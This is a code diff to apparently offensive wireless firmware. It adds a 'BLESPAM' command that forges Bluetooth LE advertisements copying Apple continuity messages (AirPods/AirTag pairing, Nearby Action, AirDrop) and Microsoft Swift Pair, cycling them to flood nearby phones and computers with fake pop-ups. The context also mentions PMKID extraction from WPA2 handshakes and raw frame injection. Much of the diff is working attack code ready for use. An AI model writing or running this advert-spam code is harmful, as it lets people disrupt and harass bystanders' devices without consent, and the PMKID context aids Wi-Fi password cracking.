@@ -753,6 +753,52 @@ static void tx_probe_req(const uint8_t* src, const char* ssid) {
   wifi_tx_raw_frame(f, n);
 }
 
+// --- D2: BLE advert spam (Apple continuity + Microsoft Swift Pair) ---------------
+// Packet layouts from https://github.com/Flipper-XFW/Xtreme-Apps ble_spam protocols.
+static uint8_t blespam_pkt(uint8_t* p, uint8_t type) {
+  if(type == 3) {   // Microsoft Swift Pair
+    static const char* names[] = {"Flipper", "Windows", "SwiftPair", "BT-Device"};
+    const char* nm = names[random(0, 4)];
+    uint8_t nl = (uint8_t)strlen(nm);
+    if(nl > 20) nl = 20;
+    p[0] = (uint8_t)(6 + nl); p[1] = 0xFF; p[2] = 0x06; p[3] = 0x00;
+    p[4] = 0x03; p[5] = 0x00; p[6] = 0x80;
+    memcpy(p + 7, nm, nl);
+    return (uint8_t)(7 + nl);
+  }
+  if(type == 1) {   // Apple Nearby Action ("Setup New iPhone", "Join This AppleTV?", ...)
+    static const uint8_t actions[] = {0x13,0x27,0x20,0x19,0x1E,0x09,0x02,0x0B,0x01,0x06,0x0D,0x2B};
+    p[0] = 10; p[1] = 0xFF; p[2] = 0x4C; p[3] = 0x00; p[4] = 0x0F; p[5] = 5;
+    p[6] = 0xC0;
+    p[7] = actions[random(0, 12)];
+    for(int i = 0; i < 3; i++) p[8 + i] = (uint8_t)random(0, 256);
+    return 11;
+  }
+  if(type == 2) {   // Apple AirDrop
+    p[0] = 23; p[1] = 0xFF; p[2] = 0x4C; p[3] = 0x00; p[4] = 0x05; p[5] = 18;
+    for(int i = 6; i < 14; i++) p[i] = 0x00;
+    p[14] = 0x01;
+    for(int i = 15; i < 23; i++) p[i] = (uint8_t)random(0, 256);
+    return 24;
+  }
+  // default: Apple Proximity Pair (AirPods / AirTag / Beats ...)
+  static const uint16_t models[] = {0x0E20,0x0A20,0x0055,0x0220,0x0F20,0x1320,
+                                    0x1420,0x1020,0x0620,0x0320,0x0B20,0x0520};
+  uint16_t m = models[random(0, 12)];
+  p[0] = 30; p[1] = 0xFF; p[2] = 0x4C; p[3] = 0x00; p[4] = 0x07; p[5] = 25;
+  p[6] = (m == 0x0055) ? 0x05 : 0x07;          // airtag -> 0x05, else "new device"
+  p[7] = (uint8_t)((m >> 8) & 0xFF);
+  p[8] = (uint8_t)(m & 0xFF);
+  p[9] = 0x55;
+  p[10] = (uint8_t)((random(0, 10) << 4) + random(0, 10));
+  p[11] = (uint8_t)((random(0, 8) << 4) + random(0, 10));
+  p[12] = (uint8_t)random(0, 256);
+  p[13] = 0x00;
+  p[14] = 0x00;
+  for(int i = 15; i < 31; i++) p[i] = (uint8_t)random(0, 256);
+  return 31;
+}
+
 // --- P6: PMKID extraction from EAPOL-Key M1 ----------------------------------
 // Clientless PMKID: many WPA2 APs put the PMKID in the RSN key-data KDE of the very
 // first EAPOL-Key (M1). We identify M1 (key info ACK set, MIC clear, RSN descriptor)
@@ -1445,6 +1491,34 @@ void loop() {
         BLE.end();
         Serial.println("BLEADV:off"); Serial1.println("BLEADV:off");
       }
+    }else if(readString.substring(0,7)=="BLESPAM"){
+      // D2: rotate BLE advert payloads (Apple continuity / Swift Pair).
+      // Args: BLESPAM <type 0=pp 1=action 2=airdrop 3=swift 4=all> [secs]
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int type = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 4;
+      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 30;
+      if(type < 0 || type > 4) type = 4;
+      if(secs < 1 || secs > 120) secs = 30;
+      if(apActive) destroyAP();
+      BLE.init();
+      BLE.beginPeripheral();
+      BLEAdvert* ad = BLE.configAdvert();
+      uint8_t pkt[31];
+      unsigned long end = millis() + (unsigned long)secs * 1000UL;
+      uint8_t t = 0;
+      while((long)(millis() - end) < 0) {
+        uint8_t use = (type == 4) ? (uint8_t)(t % 4) : (uint8_t)type;
+        uint8_t n = blespam_pkt(pkt, use);
+        ad->setAdvData(pkt, n);
+        ad->startAdv();
+        delay(120);
+        ad->stopAdv();
+        t++;
+      }
+      BLE.end();
+      String r = "BLESPAM:off " + String((unsigned)t);
+      Serial.println(r); Serial1.println(r);
     }else if(readString.substring(0,12)=="BLEGATTPROBE"){
       // P10: connect + enumerate GATT. Args: BLEGATTPROBE <aa:bb:..> [type 0=pub 1=rand]
       // Services/characteristics print to USB serial (SDK only exposes printServices()).
